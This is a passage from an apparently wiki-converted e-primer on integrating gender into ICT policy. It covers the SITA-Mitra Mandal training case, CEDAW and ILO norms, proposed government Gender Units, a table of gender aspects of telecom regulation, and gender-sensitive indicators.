and objectives. It is quite common that the situation analysis boldly admits gender issues at the level of
gender discrimination and women’s lack of participation in decision-making. However, as the plan
progresses towards describing the interventions, the vocabulary fades away towards matters of welfare
and access to factors of production (Longwe, 2002). The point where the plan fades away is a crucial
point, not only for project reformulation, but for further analysis as to what it really takes to address
gender and ICT issues. The story of SITA-Mitra Mandal illustrates this fade-away phenomenon and other
points described above (see Box 12).
Ground-up experiences of the application of ICT in development also tell us that the likely impact of
project intervention on women and men is often assumed to be equally the same for both. However, it is
clearly not. There is a need to not only be people-focused in the design of programmes and projects
utilizing ICT in development interventions, but to incorporate a gender perspective within that framework,
and place women’s empowerment in the centre of that. Designing development strategies on technology
considerations alone does not work.
The achievement of gender equality remains a challenge as it is strongly linked to human rights, in
particular women’s rights and empowerment. Even where there are constitutional guarantees for women’s
rights, these more often than not are insufficient to ensure gender equality, particularly when women
have been denied their rights on the basis of culture and tradition, and hence, within these contexts, the denial of women’s rights have traditionally not been seen as discrimination. It is therefore particularly
important for the promotion and protection of women’s rights, to establish jurisprudence that can set
universal norms and standards, and this is where the strength of the CEDAW Convention comes in. The
strength of the CEDAW Convention rests on the international consensus on its mandate of equality and
its principles, given that there are 185 ratifications/accessions as at end of October 2006. Such a mandate
is a strong counter to claims that equality between women and men should be made relative to culture
and tradition. As Rebecca Cook puts it, non-discrimination against women is now a principle of
international customary law.

! Box 12: The Story of SITA-Mitra Mandal
|-
| The Delhi-based Studies in Information Technology Applications (SITA) project was launched in
1998 by Dr K. Sane, with funding from World Banks’s infoDev, to provide computer skills training
to poor and disadvantaged women. SITA’s aim was to empower low-income women from rural,
suburban and urban areas, through computer training, customized to meet the demands of both
the public and private sectors. Women from two geographical regions, the Union Territory of Delhi
and the adjacent state of Haryana, were targeted by this project. The SITA training package enabled
intensive hands-on computer training with multilingual, audio-visual and interactive multimedia
modules for self-learning. Wherever possible, trainees were also attached to a potential employer.
A majority of the trainees involved in the project achieved commendable proficiency in basic
computer skills.
SITA experienced a financial crisis in the year 2001, after infoDev support ended. At this point,
Khalsa College (Delhi University) stepped in to provide the much-needed infrastructural support
and facilitated SITA’s interaction with the UN Asia-Pacific Centre for Technology Transfer (APCTT)
based in Delhi. APCTT played an important role in the identification of ‘internship’ as an intermediate
step in the process of securing jobs for SITA’s women. The SITA women also set up a cooperative
called ‘Mitra Mandal’ to take up job assignments. Mitra Mandal is, however, finding it difficult to
perform as envisioned. Mukul Ahmad of APCTT says, “the most important thing that Mitra Mandal
needs is marketing. Everyone in Mitra Mandal was trained in IT, but there was no component
developed to market the training. With the lack of confidence that comes from social and economic
deprivation, marketing became a problem for those trained. Also, women’s lack of proficiency in
the English language, no public relations workers from among them and their own socio-economic
situations have come in the way of anything permanent and meaningful for them.”

For the SITA-Mitra Mandal endeavour, the poor response of the labour market to the trainees has
been a disappointing experience. The inability of a majority of women to find jobs shows that
good education by itself does not serve the needs of the individuals from the disadvantaged
sector, since only a handful of the 500 women trained by SITA have jobs. Another unanticipated
difficulty was the inability of the trainees to find stable employment. That is, they got jobs but
failed to keep them for various reasons. Notable amongst them being poor communication skills
particularly in English given that most of the trainees had studied in government-run Hindi-medium
schools; low confidence levels caused by a tradition that regarded a girl as a liability; lack of family
support given that low-income families are not able to afford domestic help, baby sitters, etc. The
women that SITA caters to, have to do work at home even if they work outside with very little
support from the men in their households. This proved wrong the premise that an effective IT
training for jobs was enough to enable individuals to find jobs and build their own future. SITA has
demonstrated that this is inapplicable for most persons from a disadvantaged background,
particularly women. Furthermore, the SITA experience has shown that giving these women IT
training alone may do more harm than good as it breeds frustration through unfulfilled
expectations that end up by adding to the alienation and disillusionment.
The Datamation Foundation case in India has proved that economically disadvantaged women
do certainly possess the capabilities to qualify on the job. However, training initiatives per se, not
linked to the employment market, come with stumbling blocks. If the benefits of IT have to trickle
down to poor women, the larger institutional framework of the IT industry has to make spaces for
the poor in general, and poor women in particular. The story of SITA elucidates the need for a
more proactive policy in public and private institutions towards induction and mentoring of socially
disadvantaged women.

{{TextBox|1=''I think one of the biggest challenges for many young women is grappling with the language of the ICT for development policy processes. Many times, policy statements are written (and discussions conducted) using specialized terms, which most people would only learn in a university political science course.

==Implications for Policy, Programme and Project – Design, Implementation, Evaluation and Monitoring ==

‘Mainstreaming gender’ is both a technical and a political process which requires transformations in
organizational cultures and perspectives, as well as in the goals, structures and resource allocations of
governments and NGOs. Mainstreaming incorporates specific gender concerns within institutions, in
agenda-setting, policy-making, planning, implementation, monitoring and evaluation. Elements in the
mainstreaming task include staffing, budgeting, training programmes, policy procedures and guidelines.
Experience suggests that increased response to gender issues is linked to the level of ‘fit’ of gender
issues with the mandate and procedures of the government, and the capacity of staff members who
work on gender concerns to translate their knowledge into agency-specific procedures and
programmes.69
Recognizing the needs and perspectives of women in ICT policy can help ensure the active participation
of women in policy discussions and lead to the increased contribution of ICT to socio-economic
development, and in particular poverty reduction. When women have access to ICT, they can fully engage
as decision makers in a variety of productive tasks, including entrepreneurship and management of
SMEs.70 Thus, development goals and gender goals can advance at the same time.
According to Sonia Jorge, “there need not be any inconsistency, however, between gender-specific
objectives and development objectives; on the contrary, it is becoming increasingly apparent that one
of the most effective means to provide access to both telephone and advanced ITs to unserved and
lower income areas and populations is to encourage the development of micro, small or medium-sized
telecommunications businesses owned and managed by women,”71 as shown by the very tangible
example of Grameen Phones in Bangladesh.

Most Grameen-provided phones represented the first telecommunications service in the respective
villages. In places where the signal is weak, antennas, which serve as an advertisement of availability of
public phone services, are mounted on the women’s homes. Despite the imminent arrival of fixed wireless
phone service in rural Bangladesh, observers feel that the Grameen village phones will continue to be
viable businesses because the fixed wireless will probably target more densely populated areas and
because village women have become loyal customers of the women phone operators. Grameen Phones
has captured about half of Bangladesh’s cellular phone market. It is planning technological upgrades to
phone cards, email messaging, fax and web access through the newly established Grameen
Communications, an NGO, which plans to launch an Internet service and has started pilot Internet kiosks.

=== Importance of Substantive Consultation and Facilitation of Women’s Understanding of the Policy Process===

Poor women in developing countries could improve their lives and the lives of their families with the
help of ICT. Both the technological solutions and the successful pilot projects, along with tested finance
mechanisms, are already in place. However, neither the technological solutions nor the pilot projects
yet have sustainable business models that would allow them to be replicated in other regions. The focus
needs to turn from small projects to national programmes, supported by national policy commitments.
When these national programmes are put into place, women must ensure that they are part of them,
and that governments remember that when they talk about reaching the poor in their countries with
ICT, women are the majority of those whom they are talking about (see Figure 4).

'''Figure 4: Integrating a Gender Perspective in the Making of a Public Policy'''

However, it is imperative too that when consulting with women, that not just practical gender needs are
expressed and addressed, but also strategic gender interests of women (see section on ‘What’s the
Difference Between Practical Gender Needs and Strategic Gender Interests?’). Consultations with women
need to take place not only at the early stages of conceptualization and planning, but also at all stages
of monitoring and evaluation. These consultations need to include simplifying development policy
processes for women who have never been part of these, to enable their full understanding of the
implications of policy development, not just from within the ICT sector, but the social sectors as well.
Louise Chamberlain in her paper on ‘Considerations for Gender Advocacy vis-à-vis ICT Policy Strategy’
says that a World Bank study,72 “found that projects with greater focus on poverty reduction were more
likely to address gender” (Chamberlain, 2002). However, this e-primer would like to suggest that a greater
focus on addressing gender equality and women’s rights, will definitely address poverty reduction. Since
no such national programme exists that truly addresses gender inequality issues in all of its forms, it is
quite premature to say that the development approach that has been traditionally used is the better
approach. In fact, Chamberlain to a certain extent supports this in her paper when she said that the
study, “found projects with gender components to be more effective overall, also recognizes that such
projects may also reflect better identification of the target population, design and implementation”
(Chamberlain, 2002). The making of a public policy, in other words, must include women’s strategic
gender interests at the centre of it if resources are to be well optimized.
ICT policy generally covers three main areas: telecommunications (especially telephone communications),
broadcasting (radio and television) and the Internet. It may be national, regional or international. Each
level may have its own decision-making bodies, sometimes making different and even contradictory
policies. It is essential that gender issues be considered early in the process of the introduction of ICT in
developing countries, as ICT is not gender neutral.73 National level decisions about infrastructure can impact gender and affect women’s opportunities to use new technologies – including decisions about
what systems to put in place (at what cost to the consumer?), which suppliers of communications services
(will they have universal service obligations?), and where facilities will be located (will they be available
in rural areas?) (Hafkin and Taggart, 2001).
Many critics dismiss the issue of gender and ICT in developing countries because of the more pressing
needs that women in developing countries have for safe water, adequate food, improved health, better
education, owning land, etc. It is crucial to begin thinking outside of the ‘either-or’ mentality because
ICTs are not, in any way, in opposition to fulfilling women’s basic needs. On the contrary, ICTs will go a
very long way in reducing the stark isolation that women face when these basic needs remain unmet or
inadequately addressed.

===Importance of Recognizing and Adopting International Norms===

The process of integrating gender concerns into national ICT policy development processes can be
informed by international consensus documents to ensure cross-border interoperable norms/rules and
closer cooperation that can assist governments in meeting their commitments. Examples of internationally
agreed consensual documents include the Beijing Platform for Action (1995),74 the CEDAW Convention
(1979), the International Covenant on Economic, Social and Cultural Rights, the International Covenant
on Civil and Political Rights, and of course, the Universal Declaration of Human Rights (UDHR). The CEDAW
Convention, for example, obliges States to undertake a series of measures to end all forms of discrimination
against women, including to:

#Incorporate the principle of equality of women and men in their legal system, abolish all discriminatory laws, and adopt appropriate ones prohibiting discrimination against women;
#Establish tribunals and other public institutions to ensure the effective protection of women against discrimination; and
#Ensure elimination of all acts of discrimination against women by persons, organizations or enterprises.

The CEDAW Convention is the only human rights treaty which affirms the reproductive rights of women,
and targets culture and tradition as influential forces shaping gender roles and family relations. It affirms
women’s rights to acquire, change or retain their nationality and the nationality of their children. It is also
the only Convention that affirms the principle of substantive equality.75 The CEDAW Convention promotes
the substantive model of equality and consolidates two central approaches to equality. First it stresses
the importance of equality of opportunity in terms of women’s entitlements on equal terms with men to
the resources of a country. This has to be secured by a framework of laws and policies, and supported by
institutions and mechanisms for their operation. However, the CEDAW Convention goes beyond this in
emphasizing that the measure of a State’s action to secure the human rights of women and men needs
to ensure equality of results. The indicators of State progress, in the eyes of the CEDAW Convention, lie
not just in what the State does, but in what the State achieves in terms of real change for women. Article
2 of the CEDAW Convention enjoins the State to ensure the practical realization of rights. Thus the State
is obligated to show results, not just stop at frameworks of equality that are strong on paper. Hence, the
CEDAW Convention stresses that equality must inform the practice of institutions.
The UDHR is the main source of law in terms of fundamental and universal rights. At the international
level, the UDHR guarantees the freedom of expression of every individual. Article 5 of the UDHR in particular, provides for the freedom of individuals to communicate and express over all forms of media
(including ICT).
Conventions and Declarations of the International Labour Organization (ILO) can also be particularly critical
to the sustainability of women’s livelihoods. At the international level, the ILO sets standards and provides
the basis for justice in the area of employment. The conventions that refer to issues of gender76 are:

*Declaration on Equality of Opportunity and Treatment for Women Workers (1975). The Declaration stresses that “…all forms of discrimination on the grounds of sex which deny or restrict equality of opportunity and treatment are unacceptable and must be eliminated…” 
*Resolution on Equal Opportunities and Equal Treatment for Women and Men in Employment (1985). The Resolution discusses the need for better conditions of employment, work and life of women.
*Plan of Action on Equality of Opportunity and Treatment of Women and Men in Employment (1987) which is directed towards ILO policies and strategies. The main objective is to ensure gender mainstreaming within the institution.
*Resolution concerning ILO Action for Women Workers (1991) which reaffirms the need for joint efforts between government, employers and workers to implement the principle of equality.
*Equal Remuneration Convention 1951.
*Discrimination (Employment and Occupation) Convention 1958.
*Workers with Family Responsibilities Convention 1981.
*Part-Time Work Convention 1994.
*Home Work Convention 1996.

It is important to note though that all of these conventions and resolutions need to be understood within
the framework and interpretation of women’s rights, women’s empowerment, non-discrimination and
substantive equality, as primarily offered by the CEDAW Convention and the Beijing Platform for Action.
The chart in Figure 5 draws preliminary reference to international law and perspectives in gender policy.
Stage 1 emphasizes the need for countries to work with universal/international norms and practices, and
at the same time develop the engendered policy approach at the national level. Also at the initial stages,
some government/policy maker sensitization to the issues will be important. There should be a cross
border recognition and understanding of the issues and networking of agencies. Subsequently, the
approach requires the involvement of stakeholders and women’s groups at a very initial stage to inculcate
and develop a deep and responsive consultative process. A central group will assist to identify the
resources, make connections and identify current issues. In addition, a national agency will assist to
champion the cause of women, and provide leadership. Stage 2 is where full recognition is given to the
need for political, social and economic empowerment, and could be included into the mandate/goal of
the national champion. In Stage 3, the approach stresses the importance of inter-agency coordination.
Within a government perspective, agencies and ministries are tasked with their own priorities and work.
This fact may put up communication barriers and/or challenges between organizations. Thus the idea
here is that the inter-agency contacts, and working groups must be formed within governments and
ministries. The reality is that an engendered policy must have the political clout at the broad inter-agency
cooperation and at the highest levels of government, to reach out beyond even the scope and mandate
of the ICT regulator even with the mandate of convergence.77 The scope of gender and policy must reach out to civil society, across ministries (horizontally) such as the Ministry of Family Affairs, and vertically,
to higher levels of government, such as parliamentarians, and at the ground level – the most pragmatic
implementers – authorities, police, etc.

===Moving the Giant Towards an Inter-agency, Inter-sectoral Approach===

Government structures are established in such a way that they do not actually facilitate inter-sectoral
approaches and implementation strategies. As a result, collaborative interventions within and across
sectors are minimal and fail in tackling issues on multidimensional fronts.
Since gender issues are largely seen as the purview of national women machineries, it is important to
examine the wider policy environment and political factors underpinning the establishment of national
women machineries and their respective roles and functions. As countries shift their policy perspectives,
there is the concern that gender issues might be relegated into social programmes viewing women as
marginalized and underserved groups. Some of these critical concerns include:78

*The need to advocate for the incorporation of gender issues in the design of broad economic and sectoral adjustment policies. This requires provision of analytical tools and an information base for determining the gender impact of trade liberalization, structural adjustment, and globalization and the integration of relevant concerns;
*Mainstreaming of gender in decentralized programmes. As decentralization of government functions becomes the dominant approach to governance, the shift in decision-making and resource allocation locus requires an adaptation to local structure, rules and practices. While decentralization provides an opportunity to make programmes at local levels responsive to gender equity issues and ensures effective local level implementation of gender policies, it also increases accountability for gender equity by equipping local gender units and women’s committees with appropriate tools;
*Ambiguous mandates. National machineries and focal points have been established but the ambiguous mandates, lack of clear definition of roles and responsibilities, and inadequate political support hamper their performance. Clarity in structures, processes and mechanisms needs to be emphasized;
*Non-achievement of the full participation of women in the decision-making process at the political and administrative levels. In most countries, parliamentary representation of women has been less than 10 percent of the total; and
*Lack of clear link between action plans and their intended outcomes. There is no logical sequence of activities that will lead to the attainment of gender equality in socio-economic status.

The above concerns show that gender analysis is not a simple process for a ministry to address on its
own. Even with the establishment of national women’s ministries, due to the lack of resources79 and lack
of history in and mechanisms for substantive collaboration between ministries, governments have been
unable to reasonably put in the required constructive thought, leadership, resources and knowledge on
the social and cultural dimensions of gender within the specific contexts of a country. In such a scenario,
the concept of a dedicated Gender Unit that parallels the importance of the central economic planning
unit within government can be instrumental in taking into account many of the issues pertaining to
gender and women’s empowerment at the policy levels. A Gender Unit could assist in revising or
developing guidelines to remove gender bias and discriminatory results for women, or add new
regulations, develop circulars etc. that would better facilitate the achievement of the main goals of
concretely addressing gender issues. In addition, a Gender Unit could address the identification of
appropriate gender statistics and how to collate these in a country, while working closely with women
leaders and civil society through a substantive consultative process.
A Gender Unit should be ideally mandated to coordinate an inter-agency and inter-sectoral approach
within the country. Such a unit may need to either be placed within the central economic planning unit
of a country or at least, have a status that is on par with it. The concept or mechanism such as the Gender
Unit is not meant to replace the national women machineries already established nor the Ministry of
Women’s Affairs. The roles and responsibilities of these are quite distinct, just as the role of the Economic
Planning Unit is very distinct from say the Ministry of Agriculture or Rural Development. Nor does the
establishment of a Gender Unit discount the need to allocate adequate resources to national women
machineries and/or the Ministry of Women’s Affairs (see section on ‘The Need to Strengthen National
Women’s Machineries’).

A Gender Unit with participation by other agencies and civil society groups could study the following:
*Ways to improve government processes towards gender-sensitive policies;
*Information exchange on issues facing women and ICTs within the country;
*The relevance of an engendered approach to policy-making; in the area of ICT, especially with regard to Internet policy, and make recommendations to the telecommunications regulator (or Ministry of Communications), and to other Ministries;
*Ways of applying new technologies to network women’s groups, NGOs and other related organizations;
*Ways to develop or support relevant content for women;
*Ways to further support ICT training for women in the region, implement best practices in the use of ICTs in relation to women;
*Incorporation of women ICT experts for government or ICT projects; and
*Directory compilation of women ICT experts, and the pooling together of resources nationally and internationally.

With the necessary expertise, information and knowledge concentrated within a Gender Unit,
governments would be better able to effect a wider and more substantive consultation with women as
well as to concretely integrate a gender perspective throughout all of their agencies and development
programmes. It is therefore also critical that if a Gender Unit is indeed established that it receives more
than sufficient political support and budgetary allocations.

===Gender Concerns in ICT Policy===

Nancy Hafkin’s work which identifies the gender aspects in ICT policy is shown in Table 2. In her analysis,
Hafkin also borrows from the work of Sonia Jorge. Table 2 clearly shows that addressing gender issues
in ICT also requires governments to look at other sectoral policies and how these could adversely
impact on a progressive and gender-sensitive national ICT policy. These are issues of training and literacy
(basic skills and skills training), issues of human resource and employment (employment schemes,
paid and unpaid work in the area of ICT) and other related issues that can impede women’s active and
substantive participation – for example, related legal issues that pertain to domestic violence,
citizenship, guardianship, workers compensation, marriage/divorce, sexual harassment in the workplace,
availability of maternity leave (to international standards/ILO guidelines), availability of paternity leave,
ownership of resources particularly land, and even access to high quality and professional legal aid.

! colspan=2 | Table 2: Gender Aspects of ICT Policy Issues&lt;sup&gt;a&lt;/sup&gt;
|-
|'''ICT Issue'''
|'''Gender Aspect'''
|-
|'''Infrastructure'''
|* Is the infrastructure to be deployed throughout the country in the areas where
women predominate?&lt;br&gt;
* Are there provisions for high technology applications in areas where many women
live outside of the capital and major cities? &lt;br&gt;
* Women may be restricted from accessing ICT even when they are available in their
communities as a result of social, economic, cultural or technological constraints.&lt;br&gt;
* Gender awareness is essential in planning and implementing infrastructure.
|-
|'''Network Optimization'''
|* Does the proposed modernization provide infrastructure that is affordable to most
women?
|-
|'''Network architecture'''
|* Equipment and service providers can offer cost-effective and appropriate solutions
for the majority of women.
|-
|'''Network deployment'''
|* Choices of network infrastructure can be made that cater for the majority, focusing
on universal access to ICT and not on expensive high-capacity specialized access.&lt;br&gt;
* Affordable and forward-looking technology such as wireless alternatives that
ensure low cost and affordable access can be used.&lt;br&gt;
* When new technologies are implemented, ensure that women are included in
training.&lt;br&gt;
* The location of infrastructure should facilitate access for women.&lt;br&gt;
|-
|'''Technology choice'''
|* The affordability of service is a key issue for women.&lt;br&gt;
* Limiting technology choice can militate against new players and new technology
in the market that might bring down costs, e.g. many developing countries ban
Wi-Fi Internet&lt;sup&gt;b&lt;/sup&gt; and VoIP telephony.&lt;br&gt;
* While limitation on the choice of mobile standards (e.g. GSM, CDMA) can prevent
fragmentation of markets in initial stages, continued insistence on standards can
block the entry of mobile technologies that are cheap and effective for underserved
areas.&lt;br&gt;
* Assessments should be undertaken to determine appropriate technology choice
who will use it and for what purpose?&lt;br&gt;
* User-friendly technology, particularly in the context of low literacy levels, should
be supported and promoted.&lt;br&gt;
|-
|'''Sector liberalization'''
|* While monopoly system operators understandably dispute this, opening the
telecommunication and ICT sector to competition can bring in needed investment
and force down end user prices to make access more affordable, notably to women.
|-
|'''Universal access'''
|* Universal access concerns the establishment of telecommunications development
funds and other programmes, funded by carrier fees and other revenues collected
by regulators, to facilitate the expansion of access to the underserved.&lt;br&gt;
* It is the avenue for gender equality par excellence that has real possibilities of
positively affecting the lives of the mass of women.&lt;br&gt;
* As telecommunication development funds reflect extremely important policy and
set the rules for implementation of ICT projects in underserved areas, they deserve
great attention from gender advocates.&lt;br&gt;
* Focus should be on developing gender-aware universal access policies stressing
public access points as an alternative to more capital-intensive choices (one line
per home) and ensuring that locations of public access points are gender-sensitive
(e.g. not in bars or auto shops).&lt;br&gt;
|-
|'''Universal Service Obligations'''
|* Universal service is a specific obligation that regulators require of operators in return for licenses to contribute to universal service goals. Under universal service
obligations, regulators can mandate the provision of telecentres in underserved
areas.
* Telecentre plans need to take into account the different needs of women and men
in the concerned communities.
* Gender equality advocates could lobby for incorporating gender-based issues in
universal service rules. In most places, it has not happened yet because women’s
groups have not pushed for it.
* Demands could include that service to underserved areas be delivered reflecting
male-female distribution in the population, that priority be given to
disadvantaged women such as single mothers, widows, disabled women, etc.
* Service providers could be mandated to offer telephone subsidies or price
packages targeted at rural women, the disabled and aged.
|-
|'''Regulatory Frameworks'''
|* Regulatory frameworks can permit the re-sale of mobile phone services, which
are often profitable businesses for women to establish.&lt;br&gt;
* Regulatory frameworks can reduce licensing fees, spectrum prices and
interconnection charges that can make ICT more accessible to women.
|-
|'''Tariff policy'''
|* This covers both import duties and taxes on computer equipment and pricing
schemes for communications services. High customs duties on mobile telephones
and computer equipment as well as high prices for telephone service are deterrents
to women users.&lt;br&gt;
* In preparation for competition in the telecommunication sector, many countries
are rebalancing international and domestic tariffs to eliminate existing subsidies,
most frequently on local service. This rebalancing has meant higher rates for local
calls in many places, which hit the poor, the majority of whom are women, the
hardest. Although it is expected that competition will lower prices in the long run,
in the interim many users cannot afford local service. Among the ways to
compensate for rebalancing costs are basing tariffs on forward-looking costs and
establishing regional (e.g. rural vs. urban) tariffs.
|-
|'''Regulation'''
|* Regulation is a vital area for advocates of gender equality in ICT. Regulators do not
set policy but rather help in its implementation. Regulation produces a set of rules
for market behaviour – who can provide what service and under what conditions
and sets the framework for achieving desirable outcomes established by national
policy, particularly in the two areas of the greatest interest for ICT and to the
empowerment of women: universal access and affordable services. It is an area
that gender proponents should focus on.
|-
|'''Independent regulators'''
|* An independent regulator can compel profit-driven private sector players to deliver
on social and gender policy objectives such as universal access. In return for
granting licenses, regulators can compel service providers to provide service
to underserved areas where women predominate.&lt;br&gt;
* As regulators have the authority to set service priorities, gender equality advocates
need to lobby to ensure that service to poor women in rural areas is a priority.&lt;br&gt;
* Regulators can provide funds for research, development and testing of technology
that will serve women.
* Those that secure licenses, particularly for cellular phones, are often required to
fulfil community service obligations. Elements to ensure gender equality could
be written into these obligations.
|-
|'''Radio Frequency Spectrum'''
|* This issue also involves fees and licenses. Lower fees will encourage applicants to provide services to new markets, including women.
* Licenses should be equitably and transparently distributed, so that women-owned
businesses and businesses that serve women have a chance to secure licenses.
Only in a small number of places, women-run community radio stations have
obtained licenses.&lt;br&gt;
|-
|'''Licensing&lt;sup&gt;c&lt;/sup&gt;'''
|* If fees for telecommunications, Internet service provider and mobile service
licenses are high, they will be passed on to users, limiting the affordability to
women and the poor. High fees increase the cost of telephonic and ICT services,
discouraging women-owned communications businesses including telecentres,
phone-fax-Internet shops and mobile telephony.&lt;br&gt;
* A certain number of telecommunications licenses should be allocated to womenowned
businesses or businesses with women in management positions.&lt;br&gt;
* A gender equality licensing policy could waive license fees for communications
businesses run by women entrepreneurs or those that provide services to
underserved areas, particularly where women are concentrated.&lt;br&gt;
* Fees could be reduced for operators with gender equality and pro-handicapped
employment policies.&lt;br&gt;
* Licenses can obligate providers to provide discounted service to certain customers
such as poor women in rural areas.&lt;br&gt;
* Licensing procedures should be transparent so that women applicants can have
ready access to the information.&lt;br&gt;
* License awards can contain certain conditions that promote gender analysis and
mainstreaming for the particular company.&lt;br&gt;
|-
|'''Research and development and innovation'''
|* Are there incentives directed at encouraging women in ICT research and innovation?
* Are tools and software being developed using local languages?
* Is there research and development on technologies for the illiterate and neoliterate?
* Research efforts and programmes that promote women innovators can be
subsidized.
* Scholarships and grant programmes for women in science and technology can
be created.
* Technology programmes should promote and accept women’s participation.
* Grants or scholarships for women students and/or researchers can be provided
for technical programmes at universities.
|-
|'''Systems for learning and training'''
|* Do women have equal access to technical training?
* Programmes to train women in ICT technical and management programmes,
followed by internships, can be supported.
|-
|'''Software and applications&lt;sup&gt;d&lt;/sup&gt;'''
|* Do women have a say in what applications are being promoted?
* Are they usable or accessible to many women?
* Does the policy support free and open source software and Linux operating
systems that can make software available to communities with limited budgets?
|-
|'''Building technological capacity'''
|* Are opportunities extended to women as well as men?&lt;br&gt;
* Are there mechanisms for women to enter ICT fields and training programmes?
To develop role models for young girls? To stem the brain drain?&lt;br&gt;
* Are training opportunities available not only for technology professionals but for
non-professionals to use ICT?&lt;br&gt;
|-
|'''ICT industry development and labour policies'''
|* Encouragement and incentives should be given to encourage women to enter all segments of the ICT labour force, not just the menial electronic assembly jobs they have dominated in the past.
* Enabling policy can encourage the establishment of teleworking which has
provided jobs for many women.
|-
|'''ICT business development and e-commerce'''
|* Enabling legislation for e-commerce should encourage women entrepreneurs.&lt;br&gt;
* SME ICT and communications businesses, with possibilities for ownership by women and women's groups, should be encouraged.&lt;br&gt;
* Telecentres can provide economic opportunities for women; they should be
promoted for business development, with consideration for women owners.&lt;br&gt;
* A number of telecommunications licenses should be allocated to women-owned
businesses.&lt;br&gt;
* Carriers could be obligated to do a certain percentage of business with womenowned
businesses.&lt;br&gt;
* Training programmes could be promoted to establish ICT-related business
opportunities (e.g., e-commerce, telecentres, wireless company ownership).
|-
|'''e-government'''
|* Women could benefit from many e-government services especially land and voter
registration and license applications.
* Women would especially profit from online availability of services that would
otherwise require travel to the capital city.

* &lt;sup&gt;d&lt;/sup&gt; Intellectual Property Rights is an extremely controversial issue in the ICT sector today. Proprietary software which does not permit
changes to the software purchased by the user limits its actual use and customization for the unique needs of women. Advocates of
free and open source software counter this by promoting the sharing of software applications that can be modified by users. Such
software applications are more conducive for enabling women to shape and use them according to their needs.

===The Engendered Policy Process===

Addressing gender requires detailed process planning. Gender needs to be taken into account explicitly
not only in the content of ICT policy, but also in the process of policy elaboration, implementation, and
evaluation (Hafkin and Taggart, 2001). In other words, gender equality goals must shift from being just
integrated into public policy pronouncements to actual integration into public policy development and
implementation.

===Need for Gender-sensitive Indicators and its Definition80===

Sex dissegregation of data is only the minimum requirement to help people differentiate the impact of
development programmes, policies and projects on women and men and if possible by age, ethnicity,
geographical location, etc. Disappointingly, however, in many cases the dissegregation of data by sex
has become the only requirement to fulfil when addressing issues of gender equality.81 This should not  be so. In dealing with the ‘socialization’ of women and men and the inequalities that manifest as a result
of this process, it is essential that suitable gender-sensitive indicators that are both quantitative and
qualitative are further developed. Qualitative indicators are particularly valuable when measuring the
immeasurable (see Box 13).

|colspan=3|'''Notes'''
&lt;sup&gt;a&lt;/sup&gt; Hafkin and Taggart (2001) adapted the work of Jorge, S. Engendering IT Policy. It is equally important that, in this elaborated process
of policy development, implementation and evaluation, gender-sensitive indicators are specifically identified.
|}

Gender-sensitive indicators, as the term suggests, are indicators that track gender-related changes over
time. Their value lies in measuring whether gender equality/equity is being achieved through a number
of ways. Gender-sensitive indicators take into account that gender roles exist and point to changes in
the status and roles of women and men over time. It helps us to see in what ways a project affects
gender roles and addresses or disregards gender discrimination.
Gender-sensitive indicators should be drawn from the identification of gender issues within the specific
context of a project or activity. Many indicators that take gender into consideration such as the Gender

{| class=&quot;wikitable&quot;
|-
! Box 13: Measuring the Immeasurable
|-
| For networks and networking organizations, it is as important to identify indicators that can measure
qualitative change as it is to measure quantitative change. At the same time, the concepts of the
objective and the subjective in relation to indicators need to be reconsidered. In traditional evaluation
processes, indicators are supposed to be ‘objective and verifiable’. In practice, most indicators have
a subjective element to (in) them. For instance, ‘increased rice production’ may seem to be an objective
indicator, but it may be based on subjective assumptions that such an increase is positive per se,
regardless of how this affects the environment or different members of the farming community.
Indicators of social change are usually based on subjective criteria of justice and equity. This is as
it should be. The important issue is that these criteria are clear. There are, however, ongoing
efforts to develop indicators of qualitative achievement of both the tangible and intangible impact
of activities on people and society. Work is going on to develop indicators of social and political
change, self-reliance and empowerment and, at the same time, to set criteria and standards for
‘subjective’ indicators such as social development and empowerment so that everyone
understands what is being measured. Each network and organization must identify its own
indicators, but examples from previous efforts can help stimulate this process.

Empowerment Measure, Human and Development Index and Gender Development Index (GDI)82 are
useful tools in tracking gender equality/equity. Many of these indicators are based on gender analytical models that have emanated from a feminist analysis of societies, relationships and development. On the other hand, a growing number of gender specialists believe that indicators by themselves are insufficient to capture women’s experience especially in areas such as women’s empowerment or participation. They argue that policy makers need to pay more attention to women’s experience, towards which indicators can be a pointer.83
For example, during the World Conference on Women in 1995, APC WNSP implemented a woman-led
initiative that provided Internet access, electronic communications and information services and support to over 30,000 women attending the conference and the NGO forum. Over 40 women from 25 countries and speaking 18 languages worked together to set up and manage a computer networking facility, provided training and user support and facilitated the information flow and advocacy generated by women’s networks. One of the main goals of this initiative was to demonstrate to other women this new technology was appropriate for and could be maintained by women. Three years after this initiative, APC WNSP conducted a study to gather feedback from the women who had worked on this project and explored, in more depth, women’s relationship to and experience of working in ICTs. Among other things this study identified a series of women’s needs in relation to use of ICT. These general needs can be used as a guide for asking questions to determine specific indicators in different environments.

Anecdotal evidence in measuring the gender impact of projects, however, has been severely criticized
as being too subjective on ‘just how good the project was’.84 Since they cannot be compounded or
synthesized, comparison of different projects and approaches is difficult. As Louise Chamberlain (2002) points out, “in the end, it is more powerful to show that approach A gave an increase in women’s income of 30 percent, whereas approach B only led to a corresponding increase of 10 percent.”
The commonly held belief is that quantitative indicators are measurements that stick to hard facts and
rigid numbers and there is no question about their validity. Quantitative indicators are also seen as
‘objective and verifiable’ as they point out the number of computers in a workplace, telephones in a
community, or computer- and Internet-related training workshops. Quantitative indicators deal with outputs and are easier to define.
On the other hand, qualitative indicators are seen as subjective, unreliable and difficult to verify. Qualitative
indicators are more difficult to ascertain because these indicators probe into the whys of situations
and contexts of actions as well as perceptions of people. However, qualitative indicators are valuable to
the evaluation process because projects and initiatives are involved in looking into changes in the lives
of communities. Qualitative indicators seek to measure the impact of a project or an initiative and are
therefore used to evaluate the long-term effects and benefits. From a gender/feminist perspective,
qualitative indicators are particularly useful and important in understanding women’s experiences and
perceptions in relation to empowerment and development. For example, the number of women using
telecentres becomes more significant when it is supplemented with details of how the information that
they find and the links that they make through the Internet have contributed to their sense of
independence and empowerment (see Box 14).

{| class=&quot;wikitable&quot;
|-
! Box 14: Definition of Quantitative and Qualitative Indicators
|-
|Quantitative indicators can be defined as measures of quantity, such as the number of women
users in a telecentre, the number of women trained in computer skills or the number of women
who have access to the Internet compared to men.
Qualitative indicators can be defined as people’s judgements and perceptions about a subject, such
as the confidence those people gained in having computer skills for better employment
opportunities or having access to the Internet to for better trading/marketing opportunities.

Properly developed and interpreted, qualitative indicators can also play a significant role in identifying
constraints to implementation and obstacles to success, which would otherwise not be readily apparent.
There are techniques such as surveys that can ensure the reliability and validity of qualitative indicators.
